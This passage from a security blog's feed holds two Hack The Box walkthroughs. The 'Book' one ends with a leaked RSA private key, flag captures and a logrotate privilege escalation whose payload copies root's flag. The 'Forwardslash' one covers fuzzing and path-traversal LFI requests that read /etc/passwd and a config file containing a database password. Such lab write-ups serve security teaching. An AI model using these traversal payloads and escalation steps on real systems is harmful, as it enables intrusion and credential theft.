&lt;span class="code-line"&gt;SNbc8/ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+SRM/A&lt;/span&gt;
&lt;span class="code-line"&gt;bh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7lskGl3dh4M/2Tgl/g&lt;/span&gt;
&lt;span class="code-line"&gt;YPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+Vo5GVjWTOlfEj74k8hC6GjzWHna0&lt;/span&gt;
&lt;span class="code-line"&gt;pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7mHc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl&lt;/span&gt;
&lt;span class="code-line"&gt;/FOW2AFbkzoNbHT9GpTj5ZfacChBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k&lt;/span&gt;
&lt;span class="code-line"&gt;8J+fVHJl4IjT80uPb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOA&lt;/span&gt;
&lt;span class="code-line"&gt;MYkhsMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCftdBBP0U&lt;/span&gt;
&lt;span class="code-line"&gt;v2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi5bBLnzECgYEAlLiYGz&lt;/span&gt;
&lt;span class="code-line"&gt;P92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlWy1K/LbqIV3C01ruxVBOV7ivUYrRkx&lt;/span&gt;
&lt;span class="code-line"&gt;R/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TNnkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABI&lt;/span&gt;
&lt;span class="code-line"&gt;prhDfKUSbHzLIR4=&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect as &lt;code&gt;reader&lt;/code&gt; using ssh and grab the user's flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh reader@10.10.10.176&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System information as of Thu Feb 27 15:39:22 UTC 2020&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System load:  0.22               Processes:            153&lt;/span&gt;
&lt;span class="code-line"&gt;  Usage of /:   26.5% of 19.56GB   Users logged in:      1&lt;/span&gt;
&lt;span class="code-line"&gt;  Memory usage: 22%                IP address for ens33: 10.10.10.176&lt;/span&gt;
&lt;span class="code-line"&gt;  Swap usage:   0%&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;* Canonical Livepatch is available for installation.&lt;/span&gt;
&lt;span class="code-line"&gt;  - Reduce system reboots and improve kernel security. Activate at:&lt;/span&gt;
&lt;span class="code-line"&gt;    https://ubuntu.com/livepatch&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;114 packages can be updated.&lt;/span&gt;
&lt;span class="code-line"&gt;0 updates are security updates.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Thu Feb 27 15:36:29 2020 from 10.10.16.155&lt;/span&gt;
&lt;span class="code-line"&gt;reader@book:~$ cat user.txt &lt;/span&gt;
&lt;span class="code-line"&gt;51c1d4b5197fa30e3e5d37f8778f95bc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="enumeration"&gt;enumeration&lt;/h2&gt;
&lt;p&gt;When looking at our user's home folder we found a &lt;code&gt;backups&lt;/code&gt; folder containing
two files: &lt;code&gt;access.log&lt;/code&gt; and &lt;code&gt;access.log.1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We continue to enumerate the box and mainly the process using &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ ./pspy64&lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19874  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19873  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19875  | sleep 5 &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=1000 PID=19876  | /usr/sbin/apache2 -k start &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19878  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19877  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19879  | sleep 5 &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:19 CMD: UID=1000 PID=19880  | /usr/sbin/apache2 -k start &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19885  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19884  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19883  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19882  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19881  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19891  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19890  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19889  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19888  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19887  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19886  | /lib/systemd/systemd-udevd &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19892  | &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19894  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19893  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19895  | sleep 5 &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19898  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19897  | /bin/sh /root/log.sh &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19899  | sleep 5 &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:29 CMD: UID=1000 PID=19900  | /usr/sbin/apache2 -k start &lt;/span&gt;
&lt;span class="code-line"&gt;2020/02/27 13:51:30 CMD: UID=1000 PID=19901  | /usr/sbin/apache2 -k start&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that the root user (&lt;code&gt;UID=0&lt;/code&gt;) is periodically executing the following
commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/sbin/logrotate -f /root/log.cfg&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh /root/log.sh&lt;/span&gt;
&lt;span class="code-line"&gt;sleep 5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="logrotate"&gt;logrotate&lt;/h2&gt;
&lt;p&gt;We look at the logrotate version.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ logrotate --version&lt;/span&gt;
&lt;span class="code-line"&gt;logrotate 3.11.0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This version is &lt;a href="https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html"&gt;vulnerable to a privilege escalation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We copy the C exploit using SSH, compile it, create a specific payload file and run the exploit on
the access.log file (in debug mode).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gcc -o logrotten logrotten.c&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat payloadfile&lt;/span&gt;
&lt;span class="code-line"&gt;cp /root/root.txt /tmp/systemd-timesyncd/ ; chmod 777 /tmp/systemd-timesyncd/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;$ ./logrotten -p ./payloadfile /home/reader/backups/access.log -d&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In another terminal we put data inside the access.log file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ python -c &amp;#39;print &amp;quot;a&amp;quot;*10000&amp;#39;&amp;gt; backups/access.log&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we wait a bit for the file to be created and we can display our &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cat root.txt &lt;/span&gt;
&lt;span class="code-line"&gt;84da92adf998a1c7231297f70dd89714&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was really interesting as the web vulnerably can be found in real
websites. The privilege escalation is quit simple at it just implies to exploit
a known vulnerability.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="SQLi"></category><category term="XSS"></category><category term="logrotate"></category><category term="CVE"></category></entry><entry><title>HTB: Forwardslash</title><link href="https://maggick.fr/2020/07/htb-forwardslash.html" rel="alternate"></link><published>2020-07-07T09:09:00+02:00</published><updated>2020-07-07T09:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-07:/2020/07/htb-forwardslash.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forwardslash card" class="align-left" src="/media/2020.07/forwardslash_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/239"&gt;Forwardslash&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/44614"&gt;chivato&lt;/a&gt; publish on
April 4, 2020.
This box is classified as an hard machine. The user part inplies some
enumeration a LFI, some PHP filter, a home made backup binary. The root part
implies some home made crypto (&lt;strong&gt;don't&lt;/strong&gt;) and a LUKS image.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/forwardslash_card.png" alt="Forwardslash card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/239"&gt;Forwardslash&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/44614"&gt;chivato&lt;/a&gt; publish on
April 4, 2020.
This box is classified as an hard machine. The user part inplies some
enumeration a LFI, some PHP filter, a home made backup binary. The root part
implies some home made crypto (&lt;strong&gt;don't&lt;/strong&gt;) and a LUKS image.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 25 07:56:08 2020 as: nmap -p- -oN nmap 10.10.10.183&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.183&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Apr 25 07:56:20 2020 -- 1 IP address (1 host up) scanned in 12.27 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The homepage announce that the site was hacked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="homepage" src="/media/2020.07/forwardslash_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We don't have access to anything. We start with a simple fuzzing using &lt;code&gt;ffuf&lt;/code&gt;
but nothing interesting came out. We had the extension &lt;code&gt;.xml&lt;/code&gt;, &lt;code&gt;.txt&lt;/code&gt; and &lt;code&gt;.php&lt;/code&gt;
to &lt;code&gt;ffuf&lt;/code&gt; and relaunch it. This time we found an "interesting" page: &lt;code&gt;note.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://forwardslash.htb/FUZZ -mc 200 -c -e .xml,.txt,.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\&lt;/span&gt;
&lt;span class="code-line"&gt;      /\ \__/ /\ \__/  __  __  /\ \__/&lt;/span&gt;
&lt;span class="code-line"&gt;      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&lt;/span&gt;
&lt;span class="code-line"&gt;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&lt;/span&gt;
&lt;span class="code-line"&gt;        \ \_\   \ \_\  \ \____/  \ \_\&lt;/span&gt;
&lt;span class="code-line"&gt;          \/_/    \/_/   \/___/    \/_/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      v1.0.2&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;:: Method           : GET&lt;/span&gt;
&lt;span class="code-line"&gt;:: URL              : http://forwardslash.htb/FUZZ&lt;/span&gt;
&lt;span class="code-line"&gt;:: Extensions       : .xml .txt .php&lt;/span&gt;
&lt;span class="code-line"&gt;:: Follow redirects : false&lt;/span&gt;
&lt;span class="code-line"&gt;:: Calibration      : false&lt;/span&gt;
&lt;span class="code-line"&gt;:: Timeout          : 10&lt;/span&gt;
&lt;span class="code-line"&gt;:: Threads          : 40&lt;/span&gt;
&lt;span class="code-line"&gt;:: Matcher          : Response status: 200&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;index.php               [Status: 200, Size: 1695, Words: 207, Lines: 42]&lt;/span&gt;
&lt;span class="code-line"&gt;note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]&lt;/span&gt;
&lt;span class="code-line"&gt;:: Progress: [81876/81876] :: Job [1/1] :: 481 req/sec :: Duration: [0:02:50] :: Errors: 67 ::&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The note contain a message from the website administrator &lt;code&gt;chiv&lt;/code&gt; speaking about
a backup site.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...  Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.&lt;/p&gt;
&lt;p&gt;-chiv&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We modify our &lt;code&gt;/etc/hosts&lt;/code&gt; in order to add the &lt;code&gt;backup&lt;/code&gt; subdomain and browse to
&lt;code&gt;http://backup.forwardslash.htb/&lt;/code&gt; which is an authentication form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="backup homepage" src="/media/2020.07/forwardslash_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We are able to auto register here and access an few functionality. One was
disabled because of the hack: The profile picture upload. But the button are just
disables in the HTML source code. We can easily re-enable them with the element
inspector (browser built-in).&lt;/p&gt;
&lt;p&gt;We can then upload our profile picture with a POST request. Nevertheless we can
also modify the URL to include local files as &lt;code&gt;/etc/passwd&lt;/code&gt; by simply putting a
relative path.&lt;/p&gt;
&lt;p&gt;Here is the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 32&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;url=../../../../../../etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the server's response:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;pain:x:1000:1000:pain:/home/pain:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now that we have a LFI we can look for the database credentials. We load the
&lt;code&gt;register.php&lt;/code&gt; file as it is certainly using the database to store the new
users. We see that the file only include the &lt;code&gt;config.php&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;Here is the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 18&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;url=./register.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the server's answer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;// Include config file&lt;/span&gt;
&lt;span class="code-line"&gt;require_once &amp;quot;config.php&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;// Define variables and initialize with empty values&lt;/span&gt;
&lt;span class="code-line"&gt;$username = $password = $confirm_password = &amp;quot;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;$username_err = $password_err = $confirm_password_err = &amp;quot;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;// Processing form data when form is submitted&lt;/span&gt;
&lt;span class="code-line"&gt;if($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;){&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we load the &lt;code&gt;config.php&lt;/code&gt; file. It contains the current DB credentials
but we cannot use them for anything else (mostly connect using the SSH service).
The comment speaks about a backup of the old configuration.&lt;/p&gt;
&lt;p&gt;Here is the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 16&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;url=./config.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the server's answer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;//credentials for the temp db while we recover, had to backup old config, didn&amp;#39;t want it getting compromised -pain&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_SERVER&amp;#39;, &amp;#39;localhost&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_USERNAME&amp;#39;, &amp;#39;www-data&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_PASSWORD&amp;#39;, &amp;#39;5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_NAME&amp;#39;, &amp;#39;site&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/* Attempt to connect to MySQL database */&lt;/span&gt;
&lt;span class="code-line"&gt;$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;// Check connection&lt;/span&gt;
&lt;span class="code-line"&gt;if($link === false){&lt;/span&gt;
&lt;span class="code-line"&gt;    die(&amp;quot;ERROR: Could not connect. &amp;quot; . mysqli_connect_error());&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

